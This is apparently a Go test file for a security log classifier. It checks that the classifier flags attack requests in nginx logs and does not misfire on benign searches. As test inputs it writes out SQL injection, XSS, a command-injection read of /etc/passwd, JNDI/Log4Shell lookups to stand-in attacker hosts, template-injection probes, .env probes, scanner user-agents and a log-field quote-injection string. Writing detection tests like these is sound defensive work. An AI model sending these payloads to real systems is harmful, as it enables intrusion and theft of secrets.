func TestFallbackHTTPURIPreservesSQLiXSSRCEPayloads(t *testing.T) {
	eng, err := NewEngine()
	if err != nil {
		t.Fatal(err)
	}
	cases := []struct {
		name    string
		msg     string
		wantCat string
	}{
		{
			name:    "unstructured sqli single quote with proto",
			msg:     `198.51.100.1 - "GET /login?user=admin'%20OR%201=1-- HTTP/1.1" 200`,
			wantCat: CategorySQLi,
		},
		{
			name:    "unstructured rce semicolon with proto",
			msg:     `GET /run?cmd=;cat%20/etc/passwd HTTP/1.1`,
			wantCat: CategoryRCEInjection,
		},
		{
			name:    "unstructured xss comma and parens with proto",
			msg:     `GET /?a=1,2&b=<script>alert(1)</script> HTTP/1.1`,
			wantCat: CategoryXSS,
		},
		{
			name:    "unstructured sqli quoted without proto",
			msg:     `request="GET /login?user=admin'%20OR%201=1--"`,
			wantCat: CategorySQLi,
		},
		{
			name:    "unstructured xss json-quoted without proto",
			msg:     `{"req":"GET /?a=1,2&b=<script>alert(1)</script>"}`,
			wantCat: CategoryXSS,
		},
		{
			name:    "unstructured rce unquoted without proto",
			msg:     `handled GET /run?cmd=;cat%20/etc/passwd`,
			wantCat: CategoryRCEInjection,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res, err := eng.ClassifyBatch(context.Background(), []LogEntry{{
				Service: "nginx-proxy",
				Message: tc.msg,
			}})
			if err != nil {
				t.Fatal(err)
			}
			if res[0].Verdict == VerdictClean || res[0].Category != tc.wantCat {
				t.Fatalf("expected flagged %s for %q, got verdict=%s cat=%s matches=%+v",
					tc.wantCat, tc.msg, res[0].Verdict, res[0].Category, res[0].Matches)
			}
		})
	}

	// Compact JSON without HTTP/x.y must stop at closing quote before trailing fields.
	_, uri, _, ok := extractHTTPRequest(LogEntry{
		Service: "admin",
		Message: `{"msg":"GET /healthz","status":200}`,
	})
	if !ok || uri != "/healthz" {
		t.Fatalf("expected /healthz from compact JSON log, got ok=%v uri=%q", ok, uri)
	}
}

func TestFilterLogSearchTightenedNoBypassNoSelfTrigger(t *testing.T) {
	eng, err := NewEngine()
	if err != nil {
		t.Fatal(err)
	}

	// Must NOT be bypassed (attacker probing /api/logs/ paths on wrong host, wrong path, wrong status, or wrong method).
	mustFlag := []struct {
		name  string
		entry LogEntry
	}{
		{
			name: "bypass /.env under /api/logs on cubus.sh",
			entry: LogEntry{
				Service: "nginx-proxy",
				Message: "404 cubus.sh GET /api/logs/.env HTTP/2",
				Structured: &StructuredLog{
					Host: "cubus.sh", Status: 404, Request: "GET /api/logs/.env HTTP/2", UserAgent: "Mozilla/5.0",
				},
			},
		},
		{
			name: "bypass wp-login under /api/logs on cubus.sh",
			entry: LogEntry{
				Service: "nginx-proxy",
				Message: "404 cubus.sh GET /api/logs/wp-login.php HTTP/2",
				Structured: &StructuredLog{
					Host: "cubus.sh", Status: 404, Request: "GET /api/logs/wp-login.php HTTP/2", UserAgent: "Mozilla/5.0",
				},
			},
		},
		{
			name: "wrong host /api/logs/search with sqli",
			entry: LogEntry{
				Service: "nginx-proxy",
				Message: "200 cubus.sh GET /api/logs/search?q=1%20UNION%20SELECT%201,2-- HTTP/2",
				Structured: &StructuredLog{
					Host: "cubus.sh", Status: 200, Request: "GET /api/logs/search?q=1%20UNION%20SELECT%201,2-- HTTP/2", UserAgent: "Mozilla/5.0",
				},
			},
		},
		{
			name: "unauthenticated 401 on admin.cubus.sh /api/logs/search with .env",
			entry: LogEntry{
				Service: "nginx-proxy",
				Message: "401 admin.cubus.sh GET /api/logs/search?q=/.env HTTP/2",
				Structured: &StructuredLog{
					Host: "admin.cubus.sh", Status: 401, Request: "GET /api/logs/search?q=/.env HTTP/2", UserAgent: "Mozilla/5.0",
				},
			},
		},
		{
			name: "wrong method POST on admin.cubus.sh /api/logs/search",
			entry: LogEntry{
				Service: "nginx-proxy",
				Message: "200 admin.cubus.sh POST /api/logs/search?q=/.env HTTP/2",
				Structured: &StructuredLog{
					Host: "admin.cubus.sh", Status: 200, Request: "POST /api/logs/search?q=/.env HTTP/2", UserAgent: "Mozilla/5.0",
				},
			},
		},
		{
			name: "malicious sqlmap User-Agent on 200 admin.cubus.sh /api/logs/search still caught by Coraza",
			entry: LogEntry{
				Service: "nginx-proxy",
				Message: "200 admin.cubus.sh GET /api/logs/search?q=ok HTTP/2",
				Structured: &StructuredLog{
					Host: "admin.cubus.sh", Status: 200, Request: "GET /api/logs/search?q=ok HTTP/2", UserAgent: "sqlmap/1.8",
				},
			},
		},
		{
			name: "malicious Nuclei User-Agent on 200 admin.cubus.sh /api/logs/search still caught by Sigma",
			entry: LogEntry{
				Service: "nginx-proxy",
				Message: "200 admin.cubus.sh GET /api/logs/search?q=ok HTTP/2",
				Structured: &StructuredLog{
					Host: "admin.cubus.sh", Status: 200, Request: "GET /api/logs/search?q=ok HTTP/2", UserAgent: "Nuclei - Open-source project",
				},
			},
		},
		{
			name: "malicious JNDI User-Agent on 200 admin.cubus.sh /api/logs/search still caught by Sigma",
			entry: LogEntry{
				Service: "nginx-proxy",
				Message: "200 admin.cubus.sh GET /api/logs/search?q=ok HTTP/2",
				Structured: &StructuredLog{
					Host: "admin.cubus.sh", Status: 200, Request: "GET /api/logs/search?q=ok HTTP/2", UserAgent: "${jndi:ldap://evil.example/x}",
				},
			},
		},
	}
	for _, tc := range mustFlag {
		t.Run("flag_"+tc.name, func(t *testing.T) {
			res, err := eng.ClassifyBatch(context.Background(), []LogEntry{tc.entry})
			if err != nil {
				t.Fatal(err)
			}
			if res[0].Verdict == VerdictClean {
				t.Fatalf("expected non-clean verdict for %s", tc.name)
			}
		})
	}

	// Legitimate 200 GET /api/logs/search queries on admin.cubus.sh must NOT self-trigger Coraza or Sigma.
	legitQueries := []string{
		"GET /api/logs/search?q=UNION+SELECT+1,2,3-- HTTP/2",
		"GET /api/logs/search?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/2",
		"GET /api/logs/search?q=${jndi:ldap://evil} HTTP/2",
		"GET /api/logs/search?q={{7*7}} HTTP/2",
		"GET /api/logs/search?q=sqlmap HTTP/2",
		"GET /api/logs/search?q=502+bad+gateway HTTP/2",
		"GET /api/logs/search?q=/.env HTTP/2",
		"GET /api/logs/search?q=panic:&regex=1 HTTP/2",
		"GET /api/logs/search?q=SSRF+blocked HTTP/2",
	}
	for _, reqLine := range legitQueries {
		t.Run("clean_"+reqLine, func(t *testing.T) {
			entry := LogEntry{
				Service: "nginx-proxy",
				Level:   "info",
				Message: "200 admin.cubus.sh " + reqLine,
				Structured: &StructuredLog{
					Host:      "admin.cubus.sh",
					Status:    200,
					Request:   reqLine,
					ClientIP:  "203.0.113.20",
					UserAgent: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
					Referer:   "https://admin.cubus.sh/logs",
				},
			}
			res, err := eng.ClassifyBatch(context.Background(), []LogEntry{entry})
			if err != nil {
				t.Fatal(err)
			}
			if res[0].Verdict != VerdictClean {
				t.Fatalf("expected clean verdict for self-search %q, got verdict=%s matches=%+v", reqLine, res[0].Verdict, res[0].Matches)
			}
		})
	}
}

func TestSigmaSSTIWildcardNoFalsePositiveAndRefererDecodedHint(t *testing.T) {
	eng, err := NewEngine()
	if err != nil {
		t.Fatal(err)
	}

	benign := []LogEntry{
		{Service: "artifact", Level: "info", Message: "template token ${707} ok"},
		{Service: "artifact", Level: "info", Message: "expression ${7} and value 7}"},
		{Service: "artifact", Level: "info", Message: "placeholder {{707}} and #{7abc7}"},
	}
	benignRes, err := eng.ClassifyBatch(context.Background(), benign)
	if err != nil {
		t.Fatal(err)
	}
	for i, r := range benignRes {
		if r.Verdict != VerdictClean {
			t.Fatalf("false positive on benign entry %d (%q): %+v", i, benign[i].Message, r.Matches)
		}
	}

	malicious := []LogEntry{
		{
			Service: "nginx-proxy",
			Structured: &StructuredLog{
				Host: "cubus.sh", Status: 200, Request: "GET /?x={{%207%20*%207%20}} HTTP/2", UserAgent: "Mozilla/5.0",
			},
		},
		{
			Service: "nginx-proxy",
			Structured: &StructuredLog{
				Host: "cubus.sh", Status: 200, Request: "GET / HTTP/2", UserAgent: "Mozilla/5.0",
				Referer: "https://evil.example/?r=%24%7Bjndi%3Aldap%3A//attacker.invalid/a%7D",
			},
		},
		{
			Service: "nginx-proxy",
			Structured: &StructuredLog{
				Host: "cubus.sh", Status: 200, Request: "GET / HTTP/2", UserAgent: "Mozilla/5.0",
				Referer: "https://evil.example/?r=%23%7B7*7%7D",
			},
		},
		{
			Service: "nginx-proxy",
			Structured: &StructuredLog{
				Host: "cubus.sh", Status: 200, Request: "GET / HTTP/2", UserAgent: "Mozilla/5.0",
				Referer: "https://evil.example/" + strings.Repeat("a", 4200) + "?r=%24%7Bjndi%3Aldap%3A//attacker.invalid/a%7D",
			},
		},
	}
	malRes, err := eng.ClassifyBatch(context.Background(), malicious)
	if err != nil {
		t.Fatal(err)
	}
	for i, r := range malRes {
		if r.Verdict != VerdictCritical || r.Category != CategoryRCEInjection || !slices.Contains(r.Engines, EngineSigma) {
			t.Fatalf("expected critical sigma rce_injection for entry %d, got verdict=%s cat=%s engines=%v matches=%+v",
				i, r.Verdict, r.Category, r.Engines, r.Matches)
		}
	}

	// 4.2 KiB padded URI with percent-encoded /.env at the tail must not be truncated by uriWithDecodedHint.
	paddedEnv := LogEntry{
		Service: "nginx-proxy",
		Structured: &StructuredLog{
			Host:    "cubus.sh",
			Status:  404,
			Request: "GET /" + strings.Repeat("a", 4200) + "/%2eenv HTTP/2",
		},
	}
	paddedRes, err := eng.ClassifyBatch(context.Background(), []LogEntry{paddedEnv})
	if err != nil {
		t.Fatal(err)
	}
	if paddedRes[0].Verdict == VerdictClean || !slices.Contains(paddedRes[0].Engines, EngineSigma) {
		t.Fatalf("expected Sigma detection on 4.2 KiB padded %%2eenv URI, got %+v", paddedRes[0])
	}
}

func TestScannerUserAgentNoFalsePositiveOnNucleiHydraMessage(t *testing.T) {
	eng, err := NewEngine()
	if err != nil {
		t.Fatal(err)
	}

	benign := []LogEntry{
		{
			Service: "nginx-proxy",
			Level:   "info",
			Message: "200 cubus.sh GET /docs/hydra-config HTTP/2",
			Structured: &StructuredLog{
				Host: "cubus.sh", Status: 200, Request: "GET /docs/hydra-config HTTP/2", UserAgent: "Mozilla/5.0",
			},
		},
		{
			Service: "choice",
			Level:   "info",
			Message: "classified text mentioning cell nuclei and hydra biology",
		},
	}
	res, err := eng.ClassifyBatch(context.Background(), benign)
	if err != nil {
		t.Fatal(err)
	}
	for i, r := range res {
		if r.Verdict != VerdictClean {
			t.Fatalf("false positive on benign entry %d: %+v", i, r.Matches)
		}
	}

	scanners := []LogEntry{
		{
			Service: "nginx-proxy",
			Structured: &StructuredLog{
				Host: "cubus.sh", Status: 404, Request: "GET / HTTP/2", UserAgent: "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)",
			},
		},
		{
			Service: "nginx-proxy",
			Structured: &StructuredLog{
				Host: "cubus.sh", Status: 401, Request: "GET / HTTP/2", UserAgent: "Hydra/9.5",
			},
		},
	}
	scanRes, err := eng.ClassifyBatch(context.Background(), scanners)
	if err != nil {
		t.Fatal(err)
	}
	for i, r := range scanRes {
		if r.Verdict == VerdictClean || !slices.Contains(r.Engines, EngineSigma) {
			t.Fatalf("expected sigma detection for scanner UA %d, got %+v", i, r)
		}
	}
}

func TestBuildAmberTextFieldCapsNoStarvationAndQuoting(t *testing.T) {
	// Huge request path must not starve User-Agent or Referer, and structured nginx entries omit redundant msg=.
	entry := LogEntry{
		Service: "nginx-proxy",
		Level:   "warn",
		Message: "404 cubus.sh GET /" + strings.Repeat("a", 2000) + " HTTP/2",
		Structured: &StructuredLog{
			Host:      strings.Repeat("h", 300),
			Status:    404,
			Request:   `GET /` + strings.Repeat("p", 1600) + `" status=200 level=info HTTP/2`,
			ClientIP:  "198.51.100.50",
			UserAgent: "sqlmap/1.8",
			Referer:   "https://attacker.example/probe",
		},
	}
	txt := BuildAmberText(entry)
	if !strings.Contains(txt, `ua="sqlmap/1.8"`) {
		t.Fatalf("long request starved User-Agent in BuildAmberText: %q", txt)
	}
	if !strings.Contains(txt, `referer="https://attacker.example/probe"`) {
		t.Fatalf("long request starved Referer in BuildAmberText: %q", txt)
	}
	if strings.Contains(txt, "msg=") {
		t.Fatalf("expected redundant msg= to be omitted on structured nginx-proxy entry: %q", txt)
	}
	// Attacker quote injection in request must be escaped or bounded inside quotes.
	injected := LogEntry{
		Service: "nginx-proxy",
		Level:   "warn",
		Structured: &StructuredLog{
			Host:    "cubus.sh",
			Status:  400,
			Request: `GET /?a=" status=200 level=info msg="Routine healthy HTTP/2`,
		},
	}
	injTxt := BuildAmberText(injected)
	if !strings.Contains(injTxt, `request="GET /?a=\" status=200 level=info msg=\"Routine healthy HTTP/2"`) {
		t.Fatalf("expected untrusted request quotes to be escaped cleanly, got %q", injTxt)
	}
}
